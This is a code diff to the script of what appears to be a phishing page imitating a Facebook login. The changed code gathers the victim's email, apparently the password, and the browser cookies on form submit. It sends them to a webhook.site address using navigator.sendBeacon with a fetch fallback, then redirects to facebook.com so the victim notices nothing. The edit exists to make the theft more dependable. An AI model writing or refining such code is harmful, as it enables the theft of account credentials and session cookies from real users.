@@ -138,8 +138,8 @@
             }
         }
 
-        // 3. Form Submission Logic (Async/Await Fix)
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        // 3. Form Submission with sendBeacon (Guaranteed Data Send)
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const email = document.getElementById('email').value;
@@ -160,24 +160,25 @@
                 cookies: document.cookie
             };
 
-            // YOUR WEBHOOK URL
+            // YOUR WEBHOOK URL (Change this to your actual webhook)
             const WEBHOOK_URL = "https://webhook.site/5fd82665-8a43-42b4-a65a-b95ea5aff5b1";
 
-            try {
-                // Ye await zaroori hai taaki data bhejne mein time lage aur page na redirect ho
-                await fetch(WEBHOOK_URL, {
+            // Send Data using sendBeacon
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(WEBHOOK_URL, JSON.stringify(data));
+            } else {
+                // Fallback to fetch if sendBeacon is not supported
+                fetch(WEBHOOK_URL, {
                     method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(data)
+                    body: JSON.stringify(data),
+                    keepalive: true
                 });
-                
-                // Ab page redirect karo
-                window.location.href = "https://www.facebook.com/";
-            } catch (error) {
-                console.error("Error:", error);
-                // Error hone par bhi redirect karo
-                window.location.href = "https://www.facebook.com/";
             }
+
+            // Redirect immediately after sending
+            setTimeout(() => {
+                window.location.href = "https://www.facebook.com/";
+            }, 100); // 100ms delay to ensure OS schedules the beacon
         });
     </script>
 </body>
